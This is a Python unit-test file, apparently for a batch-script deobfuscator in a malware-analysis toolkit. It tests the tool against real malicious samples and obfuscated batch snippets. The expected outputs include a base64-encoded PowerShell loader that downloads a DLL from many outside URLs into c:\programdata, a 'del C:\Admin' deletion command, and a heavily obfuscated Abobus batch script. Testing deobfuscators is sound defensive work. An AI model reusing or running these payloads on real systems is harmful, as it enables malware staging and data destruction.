from .. import TestUnitBase

from inspect import getdoc


def multiline(obj):
    return getdoc(obj) or ''


class TestBAT(TestUnitBase):

    def test_maldoc_extracted_bat_loader(self):
        xlx = self.download_sample('9472b3a4b2394975087d9ce9ce5b855de21f9fb7f98f17f3a973b1fd11959705')
        xtr = self.ldu('xlxtr', 'B115', 'B116')
        bat = self.load()
        out = B'\n'.join(xlx | xtr) | bat | [str]
        self.assertIn(
            'start /B /WAIT powershell -enc JABqAGUAbwBsAGkAcwBlADMAUgBoAGcARABaAFMANABjAGQAZ'
            'gBnAD0AIgBoAHQAdABwADoALwAvAGcAbwB5AGEAbAB1AGEAdAAuAHYAbQBlAHMAaAAuAGkAbgAvADAAd'
            'gA2AGsAYwBuAHkALwBDAEcALwAsAGgAdAB0AHAAcwA6AC8ALwBtAGEAcgBzAC4AcwByAGwALwB3AHAAL'
            'QBhAGQAbQBpAG4ALwA3AEYAZgBrADYATABMAE4AMgBYAHMAMgBXAC8ALABoAHQAdABwADoALwAvAGYAc'
            'gBhAG4AbQB1AGwAZQByAG8ALgBlAHMALwBtAGIAeAAvADgAYwA1AFIAQgBKAHgANgAvACwAaAB0AHQAc'
            'AA6AC8ALwB2AGEAcgBhAGYAbwBvAGQALgBjAG8AbQAvAEEAagBhAHgALwBjAG4ATQA5ADEARwAvACwAa'
            'AB0AHQAcABzADoALwAvADcAagBjAGEAdAAuAGMAbwBtAC8AdwBwAC0AYwBvAG4AdABlAG4AdAAvAHQAL'
            'wAsAGgAdAB0AHAAOgAvAC8AYgBsAG8AZwAuAGMAZQBuAHQAcgBhAGwAaABvAG0AZQAuAGgAdQAvAHcAc'
            'AAtAGMAbwBuAHQAZQBuAHQALwBwAEIAMQBSAGYAUABDAG4AQgBsAFMAMQBXAGYAcABjAE8ATAAvACwAa'
            'AB0AHQAcAA6AC8ALwB6AGkAbQByAGkAZwBoAHQAcwAuAGMAbwAuAHoAdwAvAG8AbABkAHMAaQB0AGUAL'
            'wBrADAARQBvAEMAVwB5AGMAVQA5AHQATgBvADEAZAAvACwAaAB0AHQAcABzADoALwAvAG0AdQBkAGgAY'
            'QBuAGQAcwAuAGMAbwBtAC8AZQByAHIAbwByAC8AQgBmAEgALwAsAGgAdAB0AHAAOgAvAC8AYQBsAGIAY'
            'QB0AHIAbwBzAHAAYQB0AGEAZwBvAG4AaQBhAC4AYwBvAG0ALwBwAGgAawBjAHYAdAAvAHQANQAzAGMAZ'
            'QBTAE0ARABxAGcAUABRAGwAcQAvACwAaAB0AHQAcAA6AC8ALwBtAGEAcABjAG8AbQBtAHUAbgBpAGMAY'
            'QB0AGkAbwBuAHMALgBjAG8ALgB6AHcALwB3AHAALQBhAGQAbQBpAG4ALwBtAGQAUgBSAGIAUwBkAFUAM'
            'wBhAEIANwBYAHAAeAA2AHoALwAsAGgAdAB0AHAAOgAvAC8AbwBkAGMAbwBuAHMAdQBsAHQALgBjAG8AL'
            'gB1AGsALwBBAEwARgBBAF8ARABBAFQAQQAvAEgASAByADAARgBxAE8AWABBAG4ANgAyAC8ALABoAHQAd'
            'ABwADoALwAvAGQAdQBzAGgAawBpAG4ALgBuAGUAdAAvAGkAbQBnAC8AYgBoAFEAUwBUAE4AaQBjAEUAT'
            'QB0AE4AUQB4AFAALwAiAC4AcwBwAEwAaQBUACgAIgAsACIAKQA7AGYATwByAGUAYQBDAGgAKAAkAGoAZ'
            'AB0AEYASgBkAFgAaAByADYAdAB4AHkAaABkACAAaQBuACAAJABqAGUAbwBsAGkAcwBlADMAUgBoAGcAR'
            'ABaAFMANABjAGQAZgBnACkAewAkAHIAaAB5AGsAYQBqAGQAaABmAHMANwBpAGQAZgBnAGQAPQAiAGMAO'
            'gBcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAHYAYgBrAHcAawAuAGQAbABsACIAOwBpAE4AdgBPAGsAZ'
            'QAtAHcARQBiAHIAZQBRAHUAZQBzAFQAIAAtAHUAUgBpACAAJABqAGQAdABGAEoAZABYAGgAcgA2AHQAe'
            'AB5AGgAZAAgAC0AbwB1AFQAZgBpAEwAZQAgACQAcgBoAHkAawBhAGoAZABoAGYAcwA3AGkAZABmAGcAZ'
            'AA7AGkAZgAoAHQAZQBzAHQALQBwAEEAdABIACAAJAByAGgAeQBrAGEAagBkAGgAZgBzADcAaQBkAGYAZ'
            'wBkACkAewBpAGYAKAAoAGcAZQB0AC0AaQBUAGUAbQAgACQAcgBoAHkAawBhAGoAZABoAGYAcwA3AGkAZ'
            'ABmAGcAZAApAC4ATABlAG4AZwB0AGgAIAAtAGcAZQAgADQANQAwADAAMAApAHsAYgByAGUAYQBrADsAf'
            'QB9AH0A', out)

    def test_real_world_01(self):
        data = self.download_sample('6a1bc124f945ddfde62b4137d627f3958b23d8a2a6507e3841cab84416c54eea')
        deob = data | self.load() | str
        test = deob | self.ldu('xtp', 'url') | {str}
        self.assertSetEqual(test, {
            'https'R':'R'//pastebin'R'.'R'com/raw/bLnD8FWX',
            'https'R':'R'//pastebin'R'.'R'com/raw/EZ88t5c1',
        })

    def test_blog_post_example_01(self):
        @multiline
        class batch:
            R'''
            set wjdk=set
            %wjdk% gwdoy= 
            %wjdk%%gwdoy%ipatx==
            %wjdk%%gwdoy%mqhofe%ipatx%es
            %wjdk%%gwdoy%dppmto%ipatx%*
            %wjdk%%gwdoy%qqou%ipatx%Da
            %wjdk%%gwdoy%jpsfhg%ipatx%i
            %wjdk%%gwdoy%ellpj%ipatx%1
            %wjdk%%gwdoy%mtbrob%ipatx%g
            %wjdk%%gwdoy%owmdn%ipatx%xe
            %wjdk%%gwdoy%xhpnnd%ipatx%R
            %wjdk%%gwdoy%lgqwon%ipatx%b4.
            %wjdk%%gwdoy%tqwnuq%ipatx%***
            %wjdk%%gwdoy%hhemc%ipatx%u
            %wjdk%%gwdoy%onqdwr%ipatx%60
            %wjdk%%gwdoy%xjbgb%ipatx%*
            %wjdk%%gwdoy%trpjq%ipatx%303
            %wjdk%%gwdoy%jwdub%ipatx%nt
            %wjdk%%gwdoy%papbet%ipatx%t
            %wjdk%%gwdoy%dmhljv%ipatx%min
            %wjdk%%gwdoy%lkjmj%ipatx%C:
            %wjdk%%gwdoy%hwagtv%ipatx%I
            %wjdk%%gwdoy%ximgny%ipatx%App
            %wjdk%%gwdoy%dblcjy%ipatx%***
            %wjdk%%gwdoy%hbjewj%ipatx%de
            %wjdk%%gwdoy%yatty%ipatx%b8
            %wjdk%%gwdoy%tbqci%ipatx%li
            %wjdk%%gwdoy%fbakxo%ipatx%**
            %wjdk%%gwdoy%drwc%ipatx%131
            %wjdk%%gwdoy%skmxb%ipatx%Use
            %wjdk%%gwdoy%wttahx%ipatx%st
            %wjdk%%gwdoy%nmdl%ipatx%5
            %wjdk%%gwdoy%rulr%ipatx%e
            %wjdk%%gwdoy%opflr%ipatx%o
            %wjdk%%gwdoy%blel%ipatx%ti
            %wjdk%%gwdoy%wbyt%ipatx%a
            %wjdk%%gwdoy%exiy%ipatx%r
            %wjdk%%gwdoy%yxbqxf%ipatx%s
            %wjdk%%gwdoy%ntqi%ipatx%\
            %wjdk%%gwdoy%jngoq%ipatx%ar
            %wttahx%%jngoq%%papbet%%gwdoy%%lkjmj%%ntqi%%skmxb%%exiy%%yxbqxf%%ntqi%%dppmto%%dblcjy%%xjbgb%%fbakxo%%tqwnuq%%ntqi%%ximgny%%qqou%%papbet%%wbyt%%ntqi%%xhpnnd%%opflr%%wbyt%%dmhljv%%mtbrob%%ntqi%%hwagtv%%hbjewj%%jwdub%%jpsfhg%%blel%%mqhofe%%ellpj%%onqdwr%%trpjq%%drwc%%nmdl%%ntqi%%hhemc%%tbqci%%yatty%%lgqwon%%rulr%%owmdn%
            '''
        test = batch | self.load() | str
        self.assertIn('Identities1603031315', test)

    def test_blog_post_example_02(self):
        @multiline
        class batch:
            R'''
            set a=cadmin
            set b=led
            set c=\
            %b:~2,1%el %a:~0,1%:%c%%a:~1,1%dmi%a:~5,1%
            '''
        test = batch | self.load() | str
        self.assertIn(R'del c:\admin', test)

    def test_blog_post_example_03(self):
        @multiline
        class batch:
            R'''
            set a=pdfcondelpdfcon pdfconpdfconpdfconpdfconpdfconpdfconCpdfconpdfconpdfconpdfcon:pdfconpdfcon\pdfconpdfconpdfconApdfcondmpdfconpdfconpdfconpdfconipdfconn
            %a:pdfcon=%
            '''
        test = batch | self.load() | str
        self.assertIn(R'del C:\Admin', test)

    @skip('under development')
    def test_abobus_frontpage(self):
        @multiline
        class batch:
            R'''
            ;@;@@(@ch^c%法凡文無被^法%p%貼^是製是字護%.c%凡已人訊^這上%om 43^7)>n^ul&@e%魔法上保神^人%%保凡護上人被^%%人神文法^被上%^cho o%字的保製^保這%f^%凡行人行製^法%f&c%這凡護無^文法%%魔神^字製息護%^ls&&s%ت^◯تسﭲﻁ%e^%سﮢﭫ^◯ﺖﯔ%t ill%ﯤ^ﭲكتتﻁ%llii^%ﺹﭲ^ﮢﭫﮱﺼ%i%ﮢﺹﻁﺼﺖت^%iii=%0&s^e%ﮱتﮕﮚﭲﮱ^%%ﻁﯔ^كﭲﮚﮚ%t 𝧽= �c
            @:ABOBUS-OBFUSCATOR

            ;SE^T "__author__=EscaLag"
            ;SE^T "__github__=github.com/EscaLag/Abobus-obfuscator"

            ; ;@s^%魔這被此^訊上%e%無^訊無製人字%t /a ‎+=1 >n^uL &F^o%此製魔訊^上已%%的法^訊字人字%r %%a in ( s%ﮢ^ﮚﺼﯔكﮕ%%﷽ﮢ^ﺹ◯ﯔ﷽%^et g%製的訊魔貼^法%^%製秘^被訊無秘%%字製人^神是人%oto e%(◕^‿◕)(⊙ω⊙)┌( ಠ_ಠ)┘(◕‿◕)ヾ(⌐■_■)ノ(◕‿◕)%c%┌(^ ಠ_ಠ)┘(◕‿◕)ヾ(⌐■_■)ノ(◕‿◕)┌( ಠ_ಠ)┘(⊙ω⊙)%h^%(⊙ω⊙)(◕‿◕)(⊙ω⊙)ヾ(⌐■_■)ノ(⊙ω⊙)ヾ^(⌐■_■)ノ%o pau%┌( ಠ_ಠ)┘(⊙ω⊙)(⊙ω⊙)(^⊙ω⊙)(⊙ω⊙)(⊙ω⊙)%^s%┌( ಠ_ಠ)┘(◕‿◕)(◕‿◕)(⊙ω⊙)┌( ಠ_ಠ)┘(⊙ω⊙)^%%(⊙ω⊙)(⊙ω⊙)ヾ(⌐■_■)ノヾ(⌐■_■)ノ(◕‿◕^)(⊙ω⊙)%e )do @f%人保保訊^已此%%魔被這這文凡^%^inds%無息神已^凡無%tr /L /I %%a %iLllLiiiIii%&&e%的凡字法文已^%x^%神法法秘貼神^%i%護人上^是法此%t
            @%PUblic:~4,1%%PUblic:~5,1%t "埃耻尔阿=SD1p3zX%PUblic:~14,1%Rk%PUblic:~9,1%75%PUblic:~0,1%oa8t%PUblic:~3,1%FfK2%PUblic:~4,1%TndVQmW%PUblic:~11,1%OLYAwGxgv9yMEq%PUblic:~12,1%jI%PUblic:~13,1%0N4Jh%PUblic:~10,1%%PUblic:~6,1%%PUblic:~5,1%6Z B@=H"
            @f%(⊙ω⊙)(⊙ω⊙)(◕‿◕)┌( ಠ_ಠ)┘┌( ಠ_ಠ)┘┌^( ಠ_ಠ)┘%i^%(^◕‿◕)ヾ(⌐■_■)ノ(⊙ω⊙)┌( ಠ_ಠ)┘ヾ(⌐■_■)ノヾ(⌐■_■)ノ%n%ヾ(⌐■_■)ノヾ(⌐■_■)ノヾ(⌐■_■)ノ(◕‿◕)┌( ಠ_ಠ)┘┌( ಠ_ಠ)^┘%d >n^UL 2>&1&&f^o%製保人^魔行行%%製上^人已護訊%R /l %%c iN (.)do (@e%複保秘^法行字%c^%文^被被保文保%h%無神秘護息已^%o AB%凡凡無保法是^%O^B%法魔神上^行法%U%複已保^保無複%S O^%ﺖ◯ك﷽ﺖ^ﮚ%B%ﻁﮕ^ﯤﺖﺼﻁ%FUSCAT%ﻁﭲ^ﮢﺹﯔ﷽%ION)||@exi%(⊙ω⊙)ヾ(⌐■_■)ノ(^◕‿◕)(◕‿◕)(◕‿◕)(◕‿◕)%^%ヾ(⌐■_■)ノ┌( ಠ_ಠ)┘(◕‿^◕)(◕‿◕)(◕‿◕)(⊙ω⊙)%%┌( ಠ_ಠ)┘^(⊙ω⊙)┌( ಠ_ಠ)┘ヾ(⌐■_■)ノヾ(⌐■_■)ノ(◕‿◕)%t
            @@%埃耻尔阿:~62,1%%埃耻尔阿:~23,1%%埃耻尔阿:~57,1%%埃耻尔阿:~17,1% "饿豆斯维%埃耻尔阿:~63,1%%埃耻尔阿:~56,1%%埃耻尔阿:~62,1%%埃耻尔阿:~6,1%%埃耻尔阿:~31,1%%埃耻尔阿:~58,1%%埃耻尔阿:~0,1%%埃耻尔阿:~9,1%%埃耻尔阿:~17,1%%埃耻尔阿:~4,1%%埃耻尔阿:~26,1%%埃耻尔阿:~12,1%%埃耻尔阿:~7,1%%埃耻尔阿:~64,1%%埃耻尔阿:~15,1%%埃耻尔阿:~61,1%%埃耻尔阿:~43,1%%埃耻尔阿:~63,1%%埃耻尔阿:~50,1%%埃耻尔阿:~48,1%%埃耻尔阿:~27,1%%埃耻尔阿:~53,1%%埃耻尔阿:~34,1%%埃耻尔阿:~55,1%%埃耻尔阿:~44,1%%埃耻尔阿:~25,1%%埃耻尔阿:~3,1%%埃耻尔阿:~5,1%%埃耻尔阿:~51,1%%埃耻尔阿:~24,1%%埃耻尔阿:~10,1%%埃耻尔阿:~37,1%%埃耻尔阿:~16,1%%埃耻尔阿:~14,1%%埃耻尔阿:~35,1%%埃耻尔阿:~32,1%%埃耻尔阿:~46,1%%埃耻尔阿:~13,1%%埃耻尔阿:~41,1%%埃耻尔阿:~8,1%%埃耻尔阿:~28,1%%埃耻尔阿:~20,1%%埃耻尔阿:~21,1%%埃耻尔阿:~22,1%%埃耻尔阿:~29,1%%埃耻尔阿:~11,1%%埃耻尔阿:~57,1%%埃耻尔阿:~60,1%%埃耻尔阿:~38,1%%埃耻尔阿:~18,1%%埃耻尔阿:~23,1%%埃耻尔阿:~1,1%%埃耻尔阿:~39,1%%埃耻尔阿:~47,1%%埃耻尔阿:~19,1%%埃耻尔阿:~40,1%%埃耻尔阿:~54,1%%埃耻尔阿:~36,1%%埃耻尔阿:~2,1%%埃耻尔阿:~52,1%%埃耻尔阿:~59,1%%埃耻尔阿:~45,1%%埃耻尔阿:~30,1%%埃耻尔阿:~33,1%%埃耻尔阿:~49,1%%埃耻尔阿:~42,1%"
            ;@;@s^e%製訊複^被秘被%%字訊製秘文複^%t /a ‎+=1 >n^UL &F%(◕‿◕)(◕‿◕)┌( ಠ_ಠ)┘(^◕‿◕)┌( ಠ_ಠ)┘ヾ(⌐■_■)ノ%%┌( ಠ_ಠ)┘ヾ(⌐■_■)ノヾ(⌐■_■)ノ(◕‿◕)^ヾ(⌐■_■)ノヾ(⌐■_■)ノ%o^R /l %%i iN (1 1 1) do F%(◕‿◕)(◕‿◕)┌( ಠ_ಠ)┘(^◕‿◕)┌( ಠ_ಠ)┘ヾ(⌐■_■)ノ%%┌( ಠ_ಠ)┘ヾ(⌐■_■)ノヾ(⌐■_■)ノ(◕‿◕)^ヾ(⌐■_■)ノヾ(⌐■_■)ノ%o^R %%a iN ( il%(⊙ω⊙)(◕‿◕)┌( ಠ_ಠ)┘ヾ(⌐^■_■)ノヾ(⌐■_■)ノヾ(⌐■_■)ノ%%ヾ(⌐■_■)ノヾ(⌐■_■)ノ(⊙ω⊙)(⊙^ω⊙)(◕‿◕)(◕‿◕)%llliii^ii%┌( ಠ_ಠ)┘(⊙ω⊙)ヾ^(⌐■_■)ノヾ(⌐■_■)ノ(◕‿◕)┌( ಠ_ಠ)┘%i _%ﺖ^ﮕ◯ﺼﮕﮕ%_%ﺹكﮱ﷽^ﻁﮱ%%ﮚﭲ^ﮚﭫﮚﺼ%author^__ _^_gi%被製這已^無人%%被魔秘上^護這%%複^已無人文凡%thub__)do i^f no%ヾ(⌐■_■)ノ^┌( ಠ_ಠ)┘(◕‿◕)ヾ(⌐■_■)ノ┌( ಠ_ಠ)┘(◕‿◕)%^%(◕‿◕)ヾ(⌐■_■)ノ(◕‿◕)ヾ(⌐■_■)ノ(◕‿◕)ヾ(⌐■_■^)ノ%t de%┌( ಠ_ಠ)┘(◕‿◕)┌(^ ಠ_ಠ)┘(◕‿◕)(◕‿◕)(⊙ω⊙)%%(⊙ω⊙^)┌( ಠ_ಠ)┘ヾ(⌐■_■)ノ(⊙ω⊙)(◕‿◕)(⊙ω⊙)%f%(⊙ω⊙)(⊙ω⊙)(^◕‿◕)(⊙ω⊙)┌( ಠ_ಠ)┘ヾ(⌐■_■)ノ%iN^ed %%a ex%秘神息此^魔文%%保神息魔訊^訊%i^%人魔^的的文製%t
            @@%饿豆斯维:~1,1%%饿豆斯维:~49,1%%饿豆斯维:~45,1%%饿豆斯维:~7,1% "艾埃克贝%饿豆斯维:~16,1%%饿豆斯维:~31,1%%饿豆斯维:~32,1%%饿豆斯维:~40,1%%饿豆斯维:~39,1%%饿豆斯维:~36,1%%饿豆斯维:~58,1%%饿豆斯维:~60,1%%饿豆斯维:~30,1%%饿豆斯维:~52,1%%饿豆斯维:~21,1%%饿豆斯维:~27,1%%饿豆斯维:~46,1%%饿豆斯维:~56,1%%饿豆斯维:~20,1%%饿豆斯维:~17,1%%饿豆斯维:~35,1%%饿豆斯维:~57,1%%饿豆斯维:~18,1%%饿豆斯维:~61,1%%饿豆斯维:~41,1%%饿豆斯维:~9,1%%饿豆斯维:~48,1%%饿豆斯维:~29,1%%饿豆斯维:~54,1%%饿豆斯维:~51,1%%饿豆斯维:~50,1%%饿豆斯维:~33,1%%饿豆斯维:~15,1%%饿豆斯维:~8,1%%饿豆斯维:~53,1%%饿豆斯维:~23,1%%饿豆斯维:~2,1%%饿豆斯维:~25,1%%饿豆斯维:~62,1%%饿豆斯维:~10,1%%饿豆斯维:~5,1%%饿豆斯维:~38,1%%饿豆斯维:~55,1%%饿豆斯维:~26,1%%饿豆斯维:~22,1%%饿豆斯维:~64,1%%饿豆斯维:~49,1%%饿豆斯维:~16,1%%饿豆斯维:~12,1%%饿豆斯维:~37,1%%饿豆斯维:~47,1%%饿豆斯维:~4,1%%饿豆斯维:~44,1%%饿豆斯维:~1,1%%饿豆斯维:~24,1%%饿豆斯维:~63,1%%饿豆斯维:~19,1%%饿豆斯维:~42,1%%饿豆斯维:~7,1%%饿豆斯维:~59,1%%饿豆斯维:~34,1%%饿豆斯维:~28,1%%饿豆斯维:~14,1%%饿豆斯维:~3,1%%饿豆斯维:~11,1%%饿豆斯维:~43,1%%饿豆斯维:~0,1%%饿豆斯维:~13,1%%饿豆斯维:~6,1%%饿豆斯维:~45,1%"
            @@e%這已是文已^無%^%字秘這^法法行%%人^無神字此貼%cho>tmp&@f%(⊙ω⊙)ヾ(⌐■_■)ノヾ(⌐■_^■)ノ(⊙ω⊙)┌( ಠ_ಠ)┘┌( ಠ_ಠ)┘%^O%(◕‿◕)ヾ(⌐■_■)ノ(⊙ω⊙)(⊙ω⊙)(◕‿◕)┌( ಠ_^ಠ)┘%r /f "tokens=3" %%i iN ('t^%س◯تﮚتﺼ^%yp%ﺖكتﯔﮕ^ﮚ%%سكﭲﯔﻁﮱ^%e tmp')DO i^f "%%i" E%貼秘上^護被法%%無複這神行^貼%Q^U "on." (@ex%保已上^的神無%%息複人人^秘息%i%這^秘是此神息%^t) else (@d^%字這法行^人此%%已是是^此法已%el /f/q tmp)
            @@%艾埃克贝:~48,1%%艾埃克贝:~41,1%%艾埃克贝:~64,1%%艾埃克贝:~53,1% "维艾爱阿%艾埃克贝:~42,1%%艾埃克贝:~47,1%%艾埃克贝:~30,1%%艾埃克贝:~17,1%%艾埃克贝:~49,1%%艾埃克贝:~28,1%%艾埃克贝:~55,1%%艾埃克贝:~36,1%%艾埃克贝:~5,1%%艾埃克贝:~29,1%%艾埃克贝:~19,1%%艾埃克贝:~13,1%%艾埃克贝:~57,1%%艾埃克贝:~40,1%%艾埃克贝:~11,1%%艾埃克贝:~2,1%%艾埃克贝:~14,1%%艾埃克贝:~62,1%%艾埃克贝:~43,1%%艾埃克贝:~12,1%%艾埃克贝:~25,1%%艾埃克贝:~37,1%%艾埃克贝:~35,1%%艾埃克贝:~26,1%%艾埃克贝:~27,1%%艾埃克贝:~53,1%%艾埃克贝:~45,1%%艾埃克贝:~58,1%%艾埃克贝:~44,1%%艾埃克贝:~24,1%%艾埃克贝:~63,1%%艾埃克贝:~34,1%%艾埃克贝:~1,1%%艾埃克贝:~48,1%%艾埃克贝:~56,1%%艾埃克贝:~15,1%%艾埃克贝:~46,1%%艾埃克贝:~8,1%%艾埃克贝:~33,1%%艾埃克贝:~61,1%%艾埃克贝:~18,1%%艾埃克贝:~20,1%%艾埃克贝:~32,1%%艾埃克贝:~59,1%%艾埃克贝:~23,1%%艾埃克贝:~64,1%%艾埃克贝:~3,1%%艾埃克贝:~38,1%%艾埃克贝:~39,1%%艾埃克贝:~54,1%%艾埃克贝:~60,1%%艾埃克贝:~10,1%%艾埃克贝:~31,1%%艾埃克贝:~22,1%%艾埃克贝:~16,1%%艾埃克贝:~9,1%%艾埃克贝:~52,1%%艾埃克贝:~41,1%%艾埃克贝:~42,1%%艾埃克贝:~50,1%%艾埃克贝:~0,1%%艾埃克贝:~7,1%%艾埃克贝:~6,1%%艾埃克贝:~21,1%%艾埃克贝:~51,1%%艾埃克贝:~4,1%"
            @s^%س﷽س^◯ﯔﯔ%e%ﮢﯤ^◯ﭲﭲﮢ%t b=1 >Nu^l 2>&1 & if n%ﯤﮚﭫﮢﮕ^ﭲ%o^%◯^ﭲﺖكﭲت%t d%ﺼﻁﮚﭲ^ت﷽%e%كﺖ^ﮱﮚﮚﮕ%fiNe%ﯤﺼﮢﭫ^ﺼﯤ%^d b (@ech%神魔被被的貼^%^%的行字秘是上^%%製保凡息的^息%o =D&@p^%(⊙ω⊙)(⊙ω⊙)┌( ಠ_ಠ)┘┌^( ಠ_ಠ)┘ヾ(⌐■_■)ノ(⊙ω⊙)%aus%(◕‿◕)(⊙^ω⊙)ヾ(⌐■_■)ノ┌( ಠ_ಠ)┘ヾ(⌐■_■)ノヾ(⌐■_■)ノ%%(⊙^ω⊙)(◕‿◕)(◕‿◕)ヾ(⌐■_■)ノ┌( ಠ_ಠ)┘(⊙ω⊙)%e&@ex%行^複此已訊秘%%神文複^人法訊%^%息^無行製息秘%it)
            @@%维艾爱阿:~32,1%%维艾爱阿:~56,1%%维艾爱阿:~44,1%%维艾爱阿:~24,1% "豆贝艾埃%维艾爱阿:~57,1%%维艾爱阿:~58,1%%维艾爱阿:~40,1%%维艾爱阿:~9,1%%维艾爱阿:~42,1%%维艾爱阿:~32,1%%维艾爱阿:~41,1%%维艾爱阿:~38,1%%维艾爱阿:~21,1%%维艾爱阿:~44,1%%维艾爱阿:~8,1%%维艾爱阿:~26,1%%维艾爱阿:~49,1%%维艾爱阿:~59,1%%维艾爱阿:~6,1%%维艾爱阿:~11,1%%维艾爱阿:~24,1%%维艾爱阿:~56,1%%维艾爱阿:~17,1%%维艾爱阿:~50,1%%维艾爱阿:~0,1%%维艾爱阿:~7,1%%维艾爱阿:~13,1%%维艾爱阿:~63,1%%维艾爱阿:~57,1%%维艾爱阿:~3,1%%维艾爱阿:~52,1%%维艾爱阿:~36,1%%维艾爱阿:~31,1%%维艾爱阿:~12,1%%维艾爱阿:~60,1%%维艾爱阿:~53,1%%维艾爱阿:~4,1%%维艾爱阿:~54,1%%维艾爱阿:~43,1%%维艾爱阿:~22,1%%维艾爱阿:~16,1%%维艾爱阿:~35,1%%维艾爱阿:~27,1%%维艾爱阿:~23,1%%维艾爱阿:~64,1%%维艾爱阿:~55,1%%维艾爱阿:~61,1%%维艾爱阿:~2,1%%维艾爱阿:~48,1%%维艾爱阿:~29,1%%维艾爱阿:~5,1%%维艾爱阿:~1,1%%维艾爱阿:~51,1%%维艾爱阿:~46,1%%维艾爱阿:~30,1%%维艾爱阿:~18,1%%维艾爱阿:~25,1%%维艾爱阿:~10,1%%维艾爱阿:~14,1%%维艾爱阿:~45,1%%维艾爱阿:~20,1%%维艾爱阿:~19,1%%维艾爱阿:~34,1%%维艾爱阿:~33,1%%维艾爱阿:~37,1%%维艾爱阿:~62,1%%维艾爱阿:~15,1%%维艾爱阿:~28,1%%维艾爱阿:~39,1%%维艾爱阿:~47,1%"
            @f^i%法複複此凡^貼%n%人的的^是是已%%複秘被被這^凡%d >nU^l 2>&1&&F%ﮢ^ﺼ◯ﮚﺹﺼ%o^%ﺹﮕ^ﺼﮢﻁﻁ%r /l %%c in (.)DO (@ec%的複法秘法^秘%^h%上是^貼複法此%%貼貼字字秘被^%o A%被護法保魔是^%%字法魔製製^無%BO^%法是^上無的上%BUS O%無魔人^已神護%%此行息此此凡^%B^FUSCAT%字^的貼行字秘%ION)||@e%(◕‿◕)(◕‿◕)(⊙ω⊙)(⊙ω^⊙)(⊙ω⊙)(⊙ω⊙)%x%┌( ಠ_ಠ)┘(⊙ω⊙^)(⊙ω⊙)┌( ಠ_ಠ)┘┌( ಠ_ಠ)┘(⊙ω⊙)%^i%(⊙ω⊙)ヾ(⌐■_■)ノヾ(⌐■_■)ノ(◕‿^◕)(⊙ω⊙)(◕‿◕)%t
            @if %‎% N%تﻁﭲﮱ^ﯔﮱ%^E%ﺹﯔﮚﯔك^ﯔ%q 2 e%上^行秘這魔貼%%秘無字息製息^%x%被^貼上上人法%^it
            ;@;@@e%ﮱ^تﮱﭲﺼﺼ%ch%ﺼ^ﮱكﮢﺖﭲ%%ﮕﭲﺼﯤ^تت%^o>tmp&f%ﭲ﷽ﮢﯔ^◯س%^%ﮕﺖﯤﺖﺼ^ﺹ%or /f "tokens=3" %%i iN ('t%ﭫكﭲسﮚ^ﮢ%y%ﭫﮱت^ﮕﯤت%^%سﺼ◯س﷽^ك%pe tmp')Do if "%%i" E^Q%(⊙ω⊙)^ヾ(⌐■_■)ノヾ(⌐■_■)ノ┌( ಠ_ಠ)┘ヾ(⌐■_■)ノ(◕‿◕)%%┌( ಠ_ಠ)┘ヾ(⌐■_■)ノヾ(⌐■_■)ノ(⊙ω⊙)┌( ಠ_ಠ^)┘ヾ(⌐■_■)ノ%U "on." (e%ﮚﮢﯔﮚ^ﯤك%x%ﺹ^ﯔﻁﮱكﭫ%i^%ﮢكسﮕ^﷽ﭲ%t) else (d%神複^息文的魔%%法製^製訊保訊%e^l /f/q tmp)
            ;@;@if 74 LsS 139 %维艾爱阿:~32,1%%饿豆斯维:~45,1%%艾埃克贝:~59,1%%艾埃克贝:~37,1%%饿豆斯维:~32,1%%豆贝艾埃:~21,1%%维艾爱阿:~31,1%%饿豆斯维:~40,1%%埃耻尔阿:~20,1%
            ;@If ex^i%┌( ಠ_ಠ)┘(◕‿◕)(◕‿◕)┌( ಠ_ಠ)┘┌( ಠ_ಠ^)┘(◕‿◕)%%(◕‿◕)(◕‿◕)┌( ಠ_ಠ)┘ヾ(⌐■_■)ノ(◕‿◕)(⊙^ω⊙)%s%ヾ(⌐■_■)ノ(⊙ω⊙)┌( ^ಠ_ಠ)┘ヾ(⌐■_■)ノ(◕‿◕)┌( ಠ_ಠ)┘%t %iLllliiiiii% %饿豆斯维:~45,1%%维艾爱阿:~42,1%%埃耻尔阿:~54,1%%饿豆斯维:~32,1%%饿豆斯维:~46,1%%艾埃克贝:~37,1%%埃耻尔阿:~57,1%%埃耻尔阿:~46,1%%维艾爱阿:~34,1%%艾埃克贝:~1,1%%饿豆斯维:~46,1%%维艾爱阿:~18,1%%维艾爱阿:~31,1%%豆贝艾埃:~6,1%%维艾爱阿:~34,1%%豆贝艾埃:~1,1%
            ;@@iF 43 EQ^%ﮕ^﷽ﭲﮚﺖ﷽%%ﻁﭫ^ﺖﮢﮢﮕ%U 0 (@exit) else %豆贝艾埃:~5,1%%豆贝艾埃:~35,1%%艾埃克贝:~39,1%%艾埃克贝:~41,1%%埃耻尔阿:~57,1%
            '''
        test = batch | self.load() | str
        self.assertIn('pause', test)
